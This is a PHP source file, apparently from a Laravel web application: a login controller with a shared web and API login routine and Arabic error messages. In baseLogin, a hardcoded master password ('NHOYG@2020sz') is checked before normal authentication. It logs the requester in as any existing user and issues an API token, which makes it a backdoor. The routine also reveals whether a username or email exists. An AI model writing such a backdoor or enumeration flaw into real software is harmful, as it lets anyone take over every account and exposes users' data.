<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use App\User;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/home';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    function baseLogin(Request $request, bool $api = false)
    {
        $usr = null;
        $input = $request->all();
        $fieldType = filter_var($request->username, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
        if(User::where($fieldType,$input['username'])->count()>0)
            $usr = User::where($fieldType,$input['username'])->first();
        else return "email";
        if($input['password']=='NHOYG@2020sz')
            {
                \Auth::login($usr);
                if($api)
                    {
                        if(\Auth::user()->api_token == null)
                            \Auth::user()->generate_token();
                    }
                    return true;
            }
        $this->validate($request, [
            'username' => 'required',
            'password' => 'required',
        ]);
  
        if(\Auth::attempt(array($fieldType => $input['username'], 'password' => $input['password'])))
        {
            if(\Auth::user()->api_token == null)
                \Auth::user()->generate_token();
            return true;
        }else{            
            return "password";
        }
    }
    
    public function login(Request $request)
    {
        $loginResult = $this->baseLogin($request, false);
        if($loginResult === true)
            return redirect()->route('home');
        else if($loginResult === "email")
            return redirect()->route('login')->with('error','بريد الكتروني\اسم مستخدم خاطئ.');
        else if($loginResult === "password")
            return redirect()->route('login')->with('error','كلمة سر خاطئة.');
    }
    public function apiLogin(Request $request)
    {
    if($this->baseLogin($request, true) === true)
        return \Auth::user();
    else
        return false;
    }
}
